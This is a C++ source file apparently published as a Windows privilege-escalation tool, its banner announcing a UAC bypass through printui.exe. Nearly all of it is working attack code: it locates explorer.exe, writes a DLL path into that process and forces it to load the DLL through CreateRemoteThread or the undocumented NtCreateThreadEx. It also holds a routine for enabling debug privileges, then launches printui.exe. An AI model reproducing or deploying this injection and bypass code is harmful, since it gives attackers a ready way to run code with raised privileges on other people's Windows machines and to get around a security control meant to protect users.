
#include "stdafx.h"


typedef NTSTATUS(__stdcall *pNtCreateRemoteThreadEx)(
	_Out_ PHANDLE hThread,
	_In_ ACCESS_MASK desiredAccess,
	_In_ LPVOID ObjectAttributes,
	_In_ HANDLE pHandle,
	_In_ LPTHREAD_START_ROUTINE lStartRoutine,
	_In_ LPVOID lParam,
	_In_ BOOL cSuspend,
	_In_ ULONG StackZbits,
	_In_ ULONG SizeOfStackCommit,
	_In_ ULONG SizeOfStackReserved,
	_Out_ LPVOID BytesBuffer 
);

typedef struct NtCRTBuff {
	ULONG Unk;
	ULONG Unk1;
	ULONG Unk2;
	PULONG Unk3;
	ULONG Unk4;
	ULONG Unk5;
	ULONG Unk6;
	PULONG Unk7;
	ULONG Unk8;
} ;

LPWSTR 
ConvertToLPWSTR(
	_In_ const string& s
)
{
	LPWSTR ws = new wchar_t[s.size() + 1];
	copy(s.begin(), s.end(), ws);
	ws[s.size()] = 0;
	return ws;
}

UINT_PTR 
GetProcessBaseAddress(
	_In_ DWORD processID,
	_In_ HANDLE processHandle
)
{
	DWORD_PTR   baseAddress = 0;
	HMODULE     *moduleArray;
	LPBYTE      moduleArrayBytes;
	DWORD       bytesRequired;

	if (processHandle)
	{
		if (EnumProcessModulesEx(
			processHandle, NULL, 0,
			&bytesRequired, 0x02)
			)
		{
			if (bytesRequired)
			{
				moduleArrayBytes = (LPBYTE)LocalAlloc(
					LPTR, bytesRequired);

				if (moduleArrayBytes)
				{
					unsigned int moduleCount;

					moduleCount = bytesRequired / sizeof(HMODULE);
					moduleArray = (HMODULE *)moduleArrayBytes;

					if (EnumProcessModulesEx(
						processHandle, moduleArray,
						bytesRequired, &bytesRequired, 0x02)
						)
					{
						baseAddress = (DWORD_PTR)moduleArray[0];
					}
					LocalFree(moduleArrayBytes);
				}
			}
		}
	}

	return baseAddress;
}

BOOL
EnablePriv(
	_In_ LPWSTR SeName
)
{
	DWORD ReturnLength = 0;
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	DWORD address = 0x100579C;
	int value = 0;
	if (OpenProcessToken(
			GetCurrentProcess(),
			TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
			&hToken)
		)
	{
		if (!LookupPrivilegeValue(
			NULL,
			SeName,
			&tkp.Privileges[0].Luid
		)) {
			printf("%s",GetLastError());
			return FALSE;
		}
		else {
			tkp.PrivilegeCount = 1;
			tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			if (AdjustTokenPrivileges(
				hToken,
				0,
				&tkp,
				sizeof(tkp),
				NULL,
				NULL)
				) 
			{
				return TRUE;
			}
			else {
#ifdef DEBUG
				printf("%s", GetLastError());
#endif
				return FALSE;
			}
		}
	}
	else {
#ifdef DEBUG
		printf("%s", GetLastError());
#endif
		return FALSE;
	}
	return FALSE;
}

DWORD 
GetProcessByName(
	_In_ const wchar_t* hProc
)
{
	HANDLE handle;
	PROCESSENTRY32 pEntry;
	handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	pEntry.dwSize = sizeof(PROCESSENTRY32);

	do {
		if (!_wcsicmp(pEntry.szExeFile, hProc)) {
			DWORD luid = pEntry.th32ProcessID;
			CloseHandle(handle);
			return luid;
		}
	} while (Process32Next(handle,&pEntry));
	return 0;
}

DWORD _CreateRemoteThreadW(
	PCWSTR dll,
	DWORD luid
)
{
	DWORD dwSize = (lstrlenW(dll) + 1) * sizeof(wchar_t);
	HANDLE hProcess = OpenProcess(
		PROCESS_QUERY_INFORMATION |
		PROCESS_CREATE_THREAD |
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE,
		FALSE, luid
	);
	LPVOID pszLibFileRemote = (PWSTR)
		VirtualAllocEx(
			hProcess,
			NULL,
			dwSize,
			MEM_COMMIT, PAGE_READWRITE
		);
	DWORD n = WriteProcessMemory(
		hProcess,
		pszLibFileRemote,
		(PVOID)dll,
		dwSize,
		NULL
	);
	PTHREAD_START_ROUTINE pfnThreadRtn = (
		PTHREAD_START_ROUTINE)GetProcAddress(
			GetModuleHandle(TEXT("Kernel32")),
			"LoadLibraryW"
		);
	HANDLE hThread = CreateRemoteThread(
		hProcess,
		NULL,
		0,
		pfnThreadRtn,
		pszLibFileRemote,
		0,
		NULL
	);
	WaitForSingleObject(hThread, INFINITE);
	if (pszLibFileRemote != NULL)
		VirtualFreeEx(hProcess, pszLibFileRemote, 0, MEM_RELEASE);
	if (hThread != NULL)
		CloseHandle(hThread);
	if (hProcess != NULL)
		CloseHandle(hProcess);

	return(0);
}

BOOL
_CreateRemoteThread(
	_In_ LPWSTR lib,
	_In_ DWORD uid
) {
	HANDLE RemHandle = NULL;
	NtCRTBuff NTBuffer;
	LARGE_INTEGER Tmp, lTmp = { 0,};

	memset(&NTBuffer, 0, sizeof(NtCRTBuff));

	DWORD sizet = (lstrlenW(lib) + 1) * sizeof(wchar_t);
	HANDLE Handle;
	Handle = OpenProcess(
		PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
		FALSE, uid
	);
	if (Handle == NULL) { return FALSE; }
	LPVOID remLib = (PWSTR)VirtualAllocEx(Handle, NULL, sizet,
		MEM_COMMIT,PAGE_READWRITE);
	if (remLib == NULL) { return FALSE; }
	WriteProcessMemory(
		Handle,
		remLib,
		(LPVOID)lib,
		sizet,
		NULL
	);
	PTHREAD_START_ROUTINE pStartRoutine = (
		PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(_T(
		"Kernel32.dll")),"LoadLibraryW");
	if (pStartRoutine == NULL) {
		return FALSE;
	}
	NTBuffer.Unk = sizeof(NtCRTBuff);
	NTBuffer.Unk1 = 0x10003;
	NTBuffer.Unk2 = 0x8;
	NTBuffer.Unk3 = (DWORD*)&Tmp;
	NTBuffer.Unk4 = 0;
	NTBuffer.Unk5 = 0x10004;
	NTBuffer.Unk6 = 4;
	NTBuffer.Unk7 = (DWORD*)&lTmp;
	NTBuffer.Unk8 = 0;

	pNtCreateRemoteThreadEx NtCreateThreadEx =
		(pNtCreateRemoteThreadEx)GetProcAddress(GetModuleHandle(
			_T("Ntdll.dll")), "NtCreateThreadEx");
	if (NtCreateThreadEx == NULL) {
		return FALSE;
	}
	NTSTATUS _Status = NtCreateThreadEx(
		&RemHandle,
		0x1FFFFF,
		NULL,
		Handle,
		pStartRoutine,
		(LPVOID)remLib,
		FALSE,
		NULL,
		NULL,
		NULL,
		&NTBuffer
	);
	WaitForSingleObject(RemHandle,INFINITE);
	if (remLib != NULL) {
		VirtualFreeEx(
			Handle,
			remLib,
			0,
			MEM_RELEASE
		);
	}
	if (RemHandle!=NULL) {
		CloseHandle(RemHandle);
	}
	if (Handle != NULL) {
		CloseHandle(Handle);
	}
	return TRUE;
}

VOID 
main(
	_In_ VOID
)
{
	//HANDLE hProc = NULL;
	DWORD luid = NULL;
	//TCHAR lPath[MAX_PATH];
	//GetCurrentDirectory(MAX_PATH, lPath);
	//lstrcat(lPath, L"\\Iodll.dll");
	//wcout << lPath;
	//BOOL privEnabled = EnablePriv(
	//	SE_DEBUG_NAME
	//);
	luid = GetProcessByName(
		L"explorer.exe"
	);
	wcout << luid << endl;
	if (luid == 0) {
#ifdef DEBUG
		cout << GetLastError();
#endif
	}
	auto Ret = _CreateRemoteThreadW(
		L"C:\\Users\\dbg\\Desktop\\IoFO.dll",
		luid
	);

	
#ifdef DEBUG
	cout << GetLastError() << endl << Ret << endl;
	
#endif
	cout << "     __     ___     __    " << endl;
	cout << "    / /    /   |   / /    " << endl;
	cout << "   / /_   |    |  / /_    " << endl;
	cout << "  /_ _/   |___/  /___/    " << endl << endl << endl;
	cout << " yet another uacbypass!!!     " << endl << endl;
	cout << " Via SysWow64\\printui.exe!!!!     " << endl;
	cout << " by akayn     " << endl;
	HANDLE printUi = ShellExecute(
		NULL, NULL, L"C:\\Windows\\Sysnative\\printui.exe", NULL, NULL, SW_SHOW
	);
	HANDLE printU = ShellExecute(
		NULL, NULL, L"C:\\Windows\\SysWow64\\\printui.exe", NULL, NULL, SW_SHOW
	);
	int y;
	cin >> y;
}

